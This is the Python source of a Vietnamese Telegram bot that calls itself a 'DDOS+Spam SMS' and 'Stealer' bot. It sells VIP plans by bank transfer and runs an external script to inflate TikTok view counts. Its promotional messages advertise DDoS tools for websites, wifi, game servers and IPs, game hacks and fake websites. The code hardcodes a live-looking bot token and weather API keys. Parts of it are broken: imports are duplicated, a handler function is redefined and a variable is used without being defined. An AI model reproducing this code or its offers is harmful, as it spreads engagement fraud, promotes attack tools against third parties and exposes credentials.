#bot lỏ
import telebot
import psutil
import datetime
import time
import os
import subprocess
import sqlite3
import traceback
import hashlib
import requests
import sys
import socket
import urllib3
import zipfile
from pytube import YouTube
import json
import html
import io
import re
import threading
import random
import whois
import urllib.parse
import ytsearch
import pyowm
import logging
from datetime import timedelta
from io import BytesIO
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from urllib.parse import urlparse
from telebot import TeleBot, types
from youtube_search import YoutubeSearch
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Updater, CommandHandler, MessageHandler,CallbackQueryHandler
from telegram import Update, InputFile
from telegram import InlineKeyboardButton, InlineKeyboardMarkup
from telebot.types import Message
from tiktokpy import TikTokPy
from youtubesearchpython import VideosSearch
from pyowm.commons.exceptions import NotFoundError
from telegram import Update
from telegram.ext import Updater, CommandHandler, MessageHandler, filters, CallbackContext
from collections import defaultdict
from bs4 import BeautifulSoup
from selenium import webdriver
from selenium.webdriver.common.by import By
import shlex  # Thêm dòng này để import shlex
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
logging.basicConfig(level=logging.INFO)
bot_token = '7375343628:AAFMo1iXFCH1w-eZtU9cJxX_K4FxpF-RDhk'# nhập token bot

bot = telebot.TeleBot(bot_token)
start_time = time.time()
allowed_group_id = -1002149271774  # Danh sách các ID nhóm cho phép, bạn có thể thêm các ID khác vào đây

allowed_users = []
member_types = {}
processes = []
ADMIN_ID = [6244038301, 7079407562, 5483256660, 5848715045, 6488009030]  # Admin Tổng
ADMIN_AD = [5848715045, 6180411569, 7079407562] # CPU
ADMIN_DDOS = [6244038301] # API DDOS
proxy_update_count = 0
last_proxy_update_time = time.time()
key_dict = {}
last_time_used = {}  # Khởi tạo từ điển để lưu trữ thời gian lần cuối sử dụng

print("Bot DDOS+Spam SMS Vip Đã Được Khởi Chạy")
print("𝗙𝘂𝘁𝘂𝗿𝗲 𝗦𝘁𝗲𝗮𝗹𝗲𝗿 - 𝗕𝗼𝘁 ⚡️")

connection = sqlite3.connect('user_data.db')
cursor = connection.cursor()

# Tạo bảng users nếu nó chưa tồn tại
cursor.execute('''
    CREATE TABLE IF NOT EXISTS users (
        user_id INTEGER PRIMARY KEY,
        expiration_time TEXT
    )
''')
connection.commit()

def TimeStamp():
    now = str(datetime.date.today())
    return now

def load_users_from_database():
    global allowed_users, member_types  # Thêm member_types vào đây
    cursor.execute('PRAGMA table_info(users)')  # Kiểm tra xem cột member_type có tồn tại không
    columns = cursor.fetchall()
    column_names = [col[1] for col in columns]
    if 'member_type' not in column_names:
        cursor.execute('ALTER TABLE users ADD COLUMN member_type TEXT')  # Thêm cột member_type nếu chưa tồn tại
    cursor.execute('SELECT user_id, expiration_time, member_type FROM users')  # Chọn dữ liệu người dùng từ bảng
    rows = cursor.fetchall()
    for row in rows:
        user_id = row[0]
        expiration_time = datetime.datetime.strptime(row[1], '%Y-%m-%d %H:%M:%S')
        allowed_users.append(user_id)
        member_types[user_id] = row[2]  # Lưu loại thành viên vào từ điển

def save_user_to_database(connection, user_id, expiration_time, member_type):
    cursor = connection.cursor()
    cursor.execute('''
        INSERT OR REPLACE INTO users (user_id, expiration_time, member_type)
        VALUES (?, ?, ?)
    ''', (user_id, expiration_time.strftime('%Y-%m-%d %H:%M:%S'), member_type))
    connection.commit()

load_users_from_database()

@bot.message_handler(commands=['addvip'])
def add_user(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return


# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    admin_id = message.from_user.id

    user_id = message.from_user.id
    if user_id not in ADMIN_ID:
        bot.reply_to(message, '❌Lệnh addvip chỉ dành cho admin💳!')
        return

    if admin_id not in ADMIN_ID:
        bot.reply_to(message, '❌Lệnh addvip chỉ dành cho admin💳!')
        return

    if len(message.text.split()) < 3:
        bot.reply_to(message, 'Hãy Nhập Đúng Định Dạng /addvip + [id] + [số_ngày]')
        return

    user_id = int(message.text.split()[1])
    try:
        days = int(message.text.split()[2])
    except ValueError:
        bot.reply_to(message, 'Số ngày không hợp lệ!')
        return

    current_time = datetime.datetime.now()
    expiration_time = current_time + datetime.timedelta(days=days)

    # Format ngày thêm và ngày hết hạn VIP
    add_date = current_time.strftime('%Y-%m-%d %H:%M:%S')
    expiration_date = expiration_time.strftime('%Y-%m-%d %H:%M:%S')

    connection = sqlite3.connect('user_data.db')
    save_user_to_database(connection, user_id, expiration_time, 'VIP')  # Cập nhật member_type thành "VIP"
    connection.close()

    bot.reply_to(message, f'Đã Thêm ID: {user_id} Thành Plan VIP💳 {days} Ngày\n'
                          f'Ngày Thêm: {add_date}\n'
                          f'Ngày Hết Hạn: {expiration_date}')

    # Cập nhật trạng thái thành viên VIP trong cơ sở dữ liệu và từ điển member_types
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''UPDATE users SET member_type = ? WHERE user_id = ?''', ('VIP', user_id))
    connection.commit()
    member_types[user_id] = 'VIP'  # Cập nhật trạng thái của người dùng trong từ điển member_types
    connection.close()
    allowed_users.append(user_id)  # Thêm user mới vào danh sách allowed_users



@bot.message_handler(commands=['removevip'])
def remove_user(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return


# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    if len(message.text.split()) == 1:
        bot.reply_to(message, 'Hãy nhập đúng định dạng /removevip + [id]')
        return

    user_id = int(message.text.split()[1])

    # Kiểm tra xem user_id có trong cơ sở dữ liệu hay không
    connection = sqlite3.connect('user_data.db')
    cursor = connection.cursor()
    cursor.execute('''SELECT * FROM users WHERE user_id = ?''', (user_id,))
    user = cursor.fetchone()
    connection.close()

    if user:  # Nếu user tồn tại trong cơ sở dữ liệu
        connection = sqlite3.connect('user_data.db')
        cursor = connection.cursor()
        cursor.execute('''DELETE FROM users WHERE user_id = ?''', (user_id,))
        connection.commit()
        if user_id in member_types:  # Kiểm tra xem user_id có trong từ điển member_types không
            del member_types[user_id]  # Xóa trạng thái của người dùng khỏi từ điển member_types
        connection.close()
        bot.reply_to(message, f'Đã xóa người dùng có ID là : {user_id} khỏi plan VIP💳 !')
    else:
        bot.reply_to(message, f'Người dùng có ID là {user_id} không có trong cơ sở dữ liệu plan VIP💳 !')





# Function to calculate remaining VIP days
def calculate_remaining_vip_days(expiration_time):
    current_time = datetime.datetime.now()
    remaining_days = (expiration_time - current_time).days
    return remaining_days

# Function to handle /profile command
@bot.message_handler(commands=['profile'])
def user_profile(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return


# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    user_id = message.from_user.id

    # Check if the bot is active
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    # Check if the user is an admin
    user_id = message.from_user.id
    if user_id in ADMIN_ID:
        bot.reply_to(message, '📄 〡Thông tin người dùng: Bạn là Quản trị viên💳!')

    # Get member type from dictionary
    member_type = member_types.get(user_id, 'Thường')

    if member_type == 'VIP':
        connection = sqlite3.connect('user_data.db')
        cursor = connection.cursor()
        cursor.execute('''SELECT expiration_time FROM users WHERE user_id = ?''', (user_id,))
        result = cursor.fetchone()
        connection.close()

        if result:
            expiration_time_str = result[0]
            try:
                expiration_time = datetime.datetime.strptime(expiration_time_str, '%Y-%m-%d %H:%M:%S')
            except ValueError:
                bot.reply_to(message, 'Lỗi: Định dạng ngày hết hạn không hợp lệ.')
                return

            remaining_days = calculate_remaining_vip_days(expiration_time)
            reply_message = f'📄 〡Thông tin người dùng: Bạn là thành viên VIP💳.\nCòn lại {remaining_days} ngày là hết hạn VIP.'
            bot.reply_to(message, reply_message)
        else:
            bot.reply_to(message, 'Không tìm thấy thông tin VIP của người dùng.')
    else:
        bot.reply_to(message, '📄 〡Thông tin người dùng: Bạn là thành viên thường.\nDùng lệnh /muaplan nếu bạn muốn mua gói VIP💳.')






@bot.message_handler(commands=['id'])
def show_user_id(message):

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    user_id = message.from_user.id
    bot.reply_to(message, f"📄 • ID Của Bạn Là: {user_id}💳")







# Khởi tạo client OpenWeatherMap
owm = pyowm.OWM('8eb6660f9b1b6915bbbddf2f97f7f711')  # Thay 'YOUR_OW_API_KEY' bằng khóa API OpenWeatherMap thực tế của bạn
accuweather_api_key = 'aGaNDLyQYhHhOjcIr2aWNlFzOM0X3Quo'  # Thay 'YOUR_ACCUWEATHER_API_KEY' bằng khóa API AccuWeather thực tế của bạn

# Hàm để lấy thông tin chỉ số UV từ AccuWeather API
def get_uv_index(location):
    try:
        response = requests.get(f'http://dataservice.accuweather.com/currentconditions/v1/{location}?apikey={accuweather_api_key}&details=true')
        data = response.json()
        uv_index = data[0]['UVIndex']
        return uv_index
    except Exception as e:
        print(f"Error getting UV index: {e}")
        return None

def get_detailed_weather_info(location):
    try:
        observation = owm.weather_manager().weather_at_place(location)
        weather = observation.weather
        temperature = weather.temperature('celsius')
        wind = weather.wind()
        humidity = weather.humidity
        pressure = weather.pressure
        status = weather.detailed_status
        uv_index = get_uv_index(location)
        air_quality = "None"  # Cần API riêng để lấy thông tin chất lượng không khí
        dew_point = "Unclear"  # Cần API riêng để lấy thông tin điểm sương
        
        weather_info = f"🔆Thông Tin Thời Tiết ở {location}\n\n"
        weather_info += f"🌡️Nhiệt Độ : {temperature['temp']}°C\n"
        weather_info += f"💨Tốc Độ Gió : {wind['speed']} m/s\n"
        weather_info += f"🌬Hướng Gió : {wind['deg']}°\n"
        weather_info += f"💦Độ Ẩm : {humidity}%\n"
        weather_info += f"💥Áp Suất : {pressure['press']} hPa\n"
        weather_info += f"🌏Tình Trạng : {status}\n"
        weather_info += f"☀️Chỉ Số UV : {uv_index}\n" if uv_index is not None else "☀️Chỉ Số UV : None\n"
        weather_info += f"🏭Chất Lượng Không Khí : {air_quality}\n"
        weather_info += f"💧Điểm Sương : {dew_point}\n🌧Lượng Mưa : 0%"
        return weather_info
    except NotFoundError:
        return f"Không thể tìm thấy thông tin thời tiết cho {location}\nVui lòng nhập tên thành phố hoặc tỉnh thành hợp lệ tại Việt Nam\nMột Số Nơi Không Thể Tra Được Thông Tin"
    except Exception as e:
        return f"Có lỗi xảy ra khi truy xuất thông tin thời tiết: {str(e)}"

@bot.message_handler(commands=['tt', 'tt@Autospam_sms_bot'])
def detailed_weather_info(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return


# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Lấy địa điểm từ các đối số lệnh
    location = message.text.replace("/tt", "").strip()
    
    # Kiểm tra xem đã cung cấp địa điểm chưa
    if not location:
        bot.reply_to(message, "Vui lòng cung cấp địa điểm !\nExample : /tt Hà Nội")
        return
    
    # Lấy thông tin thời tiết chi tiết cho địa điểm cung cấp
    weather_info_text = get_detailed_weather_info(location)
    
    # Gửi thông tin thời tiết chi tiết như một phản hồi
    bot.reply_to(message, weather_info_text)





last_view_time = {}  # Tạo từ điển để lưu thời điểm cuối cùng mà người dùng sử dụng lệnh /view


@bot.message_handler(commands=['view'])
def viewtiktok_command(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return
    
    user_id = message.from_user.id
    username = message.from_user.username



    # Check if the chat is a group or supergroup
    if message.chat.type not in ["group", "supergroup"]:
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    # Check if the chat ID is allowed
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, 'Cách Để Buff View\n/view [url video] [số lượng view]\nEx : /view https://tiktok.com/ 500')
        return

    url, amount = args[1], args[2]
    if not amount.isdigit() or int(amount) > 500:
        bot.send_message(message.chat.id, "View tối đa là 500")
        return

    # Check last usage time
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 60:  # Check if 60 seconds have passed
            remaining_time = 60 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui lòng chờ thêm {int(remaining_time)} giây để tiếp tục sử dụng")
            return

    last_view_time[message.chat.id] = datetime.datetime.now()  # Update last usage time

    file_path = os.path.join(os.getcwd(), "view.py")
    process= subprocess.Popen(["python", file_path, url, "500"])
    processes.append(process)

    today = datetime.datetime.now().strftime('%d-%m-%Y')



    response_message = (
        f'➤ View 𝗕𝘆 👤: @{username} \n'
        f'➤ UserID : {message.from_user.id}\n'
        f'➤ URL : {url}\n'
        f'➤ Số View : {amount} views\n'
        f'➤ Trạng Thái : Thành Công\n'
        f'➤ Time : {today}\n'
        f'➤ Plan : Free\n'
        f'➤ Owner : @Vpsvanmanhgaming\n'
        f'➤ VPS Giá Rẻ💳💲: https://httpsvpsvanmanhgaming.click\n'
        f'➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n'
        f'➤ Video Hướng Dẫn: https://files.catbox.moe/tuoa6f.mp4\n'
    )
    bot.send_message(message.chat.id, response_message)







@bot.message_handler(commands=['viewvip'])
def viewtiktok_command(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    user_id = message.from_user.id
    username = message.from_user.username
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra xem người gửi có phải là admin hoặc thành viên VIP không
    user_id = message.from_user.id
    if user_id not in ADMIN_ID and member_types.get(user_id) != 'VIP':
        bot.reply_to(message, '⚠️ Gói Vip của bạn không tồn tại hoặc đã hết hạn\nVui lòng liên hệ @Vpsvanmanhgaming  để mua gói VIP\nSử dụng /profile để kiểm tra Plan\nDùng Lệnh /muaplan Để Xem Giá\n\n🚫 Sử dụng lệnh /view nếu bạn là người dùng miễn phí')
        return


    global last_view_time
    
   # Kiểm tra thời gian cuối cùng người dùng sử dụng lệnh /view
    if message.chat.id in last_view_time:
        time_passed = datetime.datetime.now() - last_view_time[message.chat.id]
        if time_passed.total_seconds() < 350:  # Kiểm tra xem đã đợi đủ 350 giây chưa
            remaining_time = 350 - time_passed.total_seconds()
            bot.send_message(message.chat.id, f"Vui lòng chờ thêm {int(remaining_time)} giây để tiếp tục sử dụng")
            return

    args = message.text.split()
    if len(args) != 3:
        bot.send_message(message.chat.id, 'Cách Để Buff View\n/view [url video] [số lượng view]\nEx : /view https://tiktok.com/ 50000')
        return

    url, amount = args[1], args[2]
    if int(amount) > 50000:
        bot.send_message(message.chat.id, "View tối đa là 50000")
        return

 
    last_view_time[message.chat.id] = datetime.datetime.now()  # Update last usage time

    file_path = os.path.join(os.getcwd(), "view.py")
    process= subprocess.Popen(["python", file_path, url, "50000"])
    processes.append(process)

    today = datetime.datetime.now().strftime('%d-%m-%Y')

    response_message = (
        f'➤ View 𝗕𝘆 👤: @{username} \n'
        f'➤ UserID : {message.from_user.id}\n'
        f'➤ URL : {url}\n'
        f'➤ Số View : {amount} views\n'
        f'➤ Trạng Thái : Thành Công\n'
        f'➤ Time : {today}\n'
        f'➤ Plan : ViP👑\n'
        f'➤ Owner : @Vpsvanmanhgaming \n'
        f'➤ VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click\n'
        f'➤ Shop 4G💳💲: https://4gvpsvanmanhgaming.click\n'
        f'➤ VPS Giá Rẻ💳💲:https://files.catbox.moe/4mvahe.mp4\n'
    )
    bot.send_message(message.chat.id, response_message)



@bot.message_handler(commands=['muaplan', 'muaplan@VPSVANMANHGAMINGBOT'])
def purchase_plan(message):
    user_id = message.from_user.id
    # Thay thế các giá trị sau bằng thông tin thanh toán của bạn
    nganhang_tpbank = "TP-BANK"
    chu_tai_khoan = "NGUYÊN VĂN TÂM"
    so_tai_khoan = "3220 1011 966"
    ten_nguoi_mua = "N.V TÂM"
    noi_dung_chuyen_khoan = f"MUAVIP-{user_id}"  # Thay đổi ở đây
    so_tien = "50.000vnđ"
    purchase_info = f'''
    <b>Thông Tin Thanh Toán 💳</b>
    <i>Thanh Toán Gói VIP 💵</i>
    - Thanh Toán Qua : <b>{nganhang_tpbank}</b>
    - Chủ Tài Khoản : <b>{chu_tai_khoan}</b>
    - Thông Tin Chuyển Khoản : <b>{so_tai_khoan}</b>
    - Họ Tên : <b>{ten_nguoi_mua}</b>
    - Nội Dung : <b>{noi_dung_chuyen_khoan}</b>
    - Số Tiền : <b>{so_tien}</b>
    ━━━━━━━━━━━━━━━━━━━
    https://files.catbox.moe/bdle86.mp4
    ━━━━━━━━━━━━━━━━━━━
    Liên hệ ngay với tôi @Vpsvanmanhgaming nếu bạn gặp lỗi 
    Dùng lệnh /admin1 để hiển thị thêm thông tin.
    VPS Giá Rẻ💳💲:https://httpsvpsvanmanhgaming.click
    Shop 4G💳💲:https://4gvpsvanmanhgaming.click
    '''

    bot.reply_to(message, purchase_info, parse_mode='HTML')





# Định nghĩa từ điển languages với các ngôn ngữ và mã hiển thị tương ứng
languages = {
    'vi-beta': 'Tiếng Việt 🇻🇳',
    'en-beta': 'English 🇺🇸'
}

# Thiết lập ngôn ngữ mặc định
current_language = 'en-beta'

# Cập nhật mã xử lý cho lệnh /language
@bot.message_handler(commands=['language'])
def switch_language(message):

    user_id = message.from_user.id
    if not is_bot_active:
        bot.reply_to(message, 'Bot hiện đang tắt. Vui lòng chờ khi nào được bật lại.')
        return

    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

    global current_language
    
    # Kiểm tra xem có tham số ngôn ngữ được cung cấp không
    if len(message.text.split()) > 1:
        # Lấy ngôn ngữ từ tham số dòng lệnh
        new_language = message.text.split()[1].lower()
        if new_language in languages:  # Kiểm tra ngôn ngữ có hợp lệ không
            # Lưu ngôn ngữ mới
            current_language = new_language
            # Tạo link tương ứng với ngôn ngữ mới
            link = f"https://t.me/setlanguage/{new_language}"
            # Phản hồi cho người dùng về việc thay đổi ngôn ngữ và liên kết tương ứng
            bot.reply_to(message, f">> Để Chuyển Sang Ngôn Ngữ {languages[new_language]} !\nVui lòng sử dụng liên kết sau để thay đổi ngôn ngữ: {link}")
        else:
            # Nếu ngôn ngữ không hợp lệ, thông báo cho người dùng
            bot.reply_to(message, ">>Ngôn ngữ không hợp lệ !\nVui lòng chọn 'vi-beta' cho Tiếng Việt 🇻🇳 hoặc 'en' cho English 🇺🇸")
    else:
        # Nếu không có tham số ngôn ngữ, thông báo cho người dùng
        bot.reply_to(message, ">> Nhập ngôn ngữ bạn muốn chuyển đổi !\n>> [ vi-beta 🇻🇳 hoặc en-beta 🇺🇸 ]\nVD: /language vi-beta")





@bot.message_handler(commands=['vpsgiare'])
def lenh(message):
    video_url = "https://files.catbox.moe/uuakbj.mp4"  # Thay thế bằng URL thực tế của video
    help_text = '''
👉 **Giảm Giá VPS 15% Nha Anh Em:**

👉 https://httpsvpsvanmanhgaming.click  👈

👉 **Giảm Giá 10% Nha Mong Mọi Người Sẽ Ủng Hộ Mình Lâu Dài Nha:>** 😘❤️🥰👈

👉 **MÃ Giảm 10% Nha:** 😁👈

👉 **Ưu Ái Anh Em Nên Mua VPS:** 👈

👉 **<  VPS 2-4-30  nha : >** 😝👈

👉 **🥰Chia Sẽ Cho Anh Em Mã Giảm Giá 10k Nha:>>** 🥰👈

👉 **< vpsvanmanhgaming >**

👉 **SALE VPS CHỈ TỪ 75K !!** 👈

👉 **WEBSITE😘❤️🥰:**

👉 https://httpsvpsvanmanhgaming.click 👈

👉 **CLOUD VPS:** 😘❤️🥰

👉 **BÁN Hosting , thuê api bank , siêu rẻ….** 👈

👉 **Bán VPS Việt giá rẻ, treo game 24/7..., IP Riêng:** 👈😘❤️

👉 **75k giá siêu rẻ full hệ điều hành CLOUD VPS GIÁ RẺ CÓ CẢ HỆ ĐIỀU HÀNH** 👈😘❤️

👉 **<  window / linux  >** 👈😘❤️

👉 **Bảo hành hỗ trợ 24/24 uy tín 100% >** 👈😘❤️🥰

👉 **Nạp Tự Động 5s !!** 😘❤️🥰👈

👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈

👉 0559140928 👈

👉 **Link Facebook Để Thuê Nha:** 👈

👉 facebook.com/profile.php?id=100072182542348 👈

👉 **Link TikTok Để Thuê Nha:** 👈

👉 https://www.tiktok.com/@kecodon7103 👈 

👉 **LINK TLE ĐỂ THUÊ NHA:** 👈

👉https://t.me/Vpsvanmanhgaming 👈 

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipvc 👈

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipfc 👈

👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈

👉 https://4gvpsvanmanhgaming.click/ 👈

👉 **Link Shop VPS Nha:** 👈

👉 https://httpsvpsvanmanhgaming.click  👈

👉 **Link Shop 4G** 👈

👉 https://4gvpsvanmanhgaming.click 👈

👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈


'''
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
    
    try:
        bot.send_video(message.chat.id, video_url, caption="Video giới thiệu dịch vụ cho thuê VPS uy tín, an toàn và tiện lợi nha:>", parse_mode='Markdown')
    except telebot.apihelper.ApiTelegramException as e:
        if "failed to get HTTP URL content" in str(e):
            # Tải xuống video và gửi tệp trực tiếp nếu URL không hoạt động
            video_file = requests.get(video_url)
            with open("video.mp4", "wb") as f:
                f.write(video_file.content)
            with open("video.mp4", "rb") as video:
                bot.send_video(message.chat.id, video, caption="Video giới thiệu dịch vụ cho thuê VPS uy tín, an toàn và tiện lợi nha:>", parse_mode='Markdown')




@bot.message_handler(commands=['hackgamesgiare'])
def lenh(message):
    video_url = "https://files.catbox.moe/agpg21.mp4"  # Thay thế bằng URL thực tế của video
    help_text = '''
🎮 NEON MOD - Cung Cấp Hack Games Giá Rẻ 🎮

✨ Cung cấp Hack Map & các loại game khác miễn phí, an toàn. ✨

🌟 Tham gia kênh để nhận Key VIP miễn phí: 🌟

🔗  https://t.me/Channel_NeonMod

🌟 Tham gia kênh để tải Hack VIP miễn phí: 🌟

🔗 https://t.me/File_NeonMod

🌟 Tham gia kênh tải tất cả Hack Games: 🌟

🔗 https://t.me/pulfsharemod

🌟 Tham gia kênh BOT Tiện ích: 🌟

🔗 https://t.me/geminivipchat

💰 Giá cả hợp lý: 💰
• KEY: 215 1 Tháng
• KEY: 180 3 Tuần
• KEY: 160 2 Tuần
• KEY: 145 1 Tuần

👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈

👉 0559140928 👈

👉 **Link Facebook Để Thuê Nha:** 👈

👉 facebook.com/profile.php?id=100072182542348 👈

👉 **Link TikTok Để Thuê Nha:** 👈

👉 https://www.tiktok.com/@kecodon7103 👈 

👉 **LINK TLE ĐỂ THUÊ NHA:** 👈

👉https://t.me/Vpsvanmanhgaming 👈 

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipvc 👈

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipfc 👈

👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈

👉 https://hdpattv.pro.vn/ 👈

👉 **Link Shop VPS Nha:** 👈

👉 https://httpsvpsvanmanhgaming.click  👈

👉 **Link Shop 4G** 👈

👉 https://4gvpsvanmanhgaming.click 👈

👉 **Copyright 2024 © Powered By HTTPSVPSVANMANHGAMING.CLICK** 👈
https://files.catbox.moe/0jw5et.mp4
    '''
    bot.send_message(message.chat.id, help_text, parse_mode='Markdown', disable_web_page_preview=True)
    bot.send_video(message.chat.id, video_url, caption="🎥 Video giới thiệu dịch vụ Hack Games tại Neon Mod", parse_mode='html')









@bot.message_handler(commands=['c25vip', 'c25vip@VPSVANMANHGAMINGBOT'])
def lenh(message):
    
# Kiểm tra nếu cuộc trò chuyện không phải là loại "group" hoặc "supergroup"
    if message.chat.type != "group" and message.chat.type != "supergroup":
        bot.reply_to(message, '>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return

# Kiểm tra nếu ID nhóm không phải là nhóm hợp lệ
    if message.chat.id != allowed_group_id:
        bot.reply_to(message, 'Trộm bot à:\n>> Xin Lỗi Tôi Chỉ Hoạt Động Trên Nhóm : https://t.me/botvipvc')
        return
    
    help_text = '''

🌟 **DỊCH VỤ MẠNG XÃ HỘI VÀ CÔNG CỤ CHUYÊN NGHIỆP** 🌟

📱 **Mạng Xã Hội:**
• Facebook
• TikTok
• Instagram
• Youtube

🌐 **Tạo Website:**
• Shop nick, shop dịch vụ mạng xã hội, web gạch thẻ
• Web check scam, web bán VPS-hosting-tên miền, TXCL
• Web bán mã nguồn, web fake bất cứ gì
• Web info cá nhân và nhiều hơn nữa (500k-2000k)

🛠️ **Bán Các Công Cụ:**
• Tool DDoS web, wifi, server game, VPS, IP (200k)
• Tool buff view TikTok (Chưa bán)
• Tool buff share bài viết (70k)
• Tool go like, tăng đăng status, tăng tương tác chuyên nghiệp (120k)
• Tool reg page, buff follow, like, share, comment, view story Pro5,... (350k)
• Tool lấy proxy (70k)
• Và nhiều công cụ khác

💚 **Lên Tích Xanh Facebook:** 800k

👉 **Số Điện Thoại Zalo Để Thuê Nha:** 👈

👉 0559140928 👈

👉 **Link Facebook Để Thuê Nha:** 👈

👉 facebook.com/profile.php?id=100072182542348 👈

👉 **Link TikTok Để Thuê Nha:** 👈

👉 https://www.tiktok.com/@kecodon7103 👈 

👉 **LINK TLE ĐỂ THUÊ NHA:** 👈

👉https://t.me/Vpsvanmanhgaming 👈 

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipvc 👈

👉 **NHÓM TLE GIAO LƯU :** 👈

👉 https://t.me/botvipfc 👈

👉 **4G Giá Rẻ Học Sinh Và Sinh Viên Đều Có Thể Mua Nha:** 👈

👉 https://hdpattv.pro.vn/ 👈

👉 **Link Shop VPS Nha:** 👈

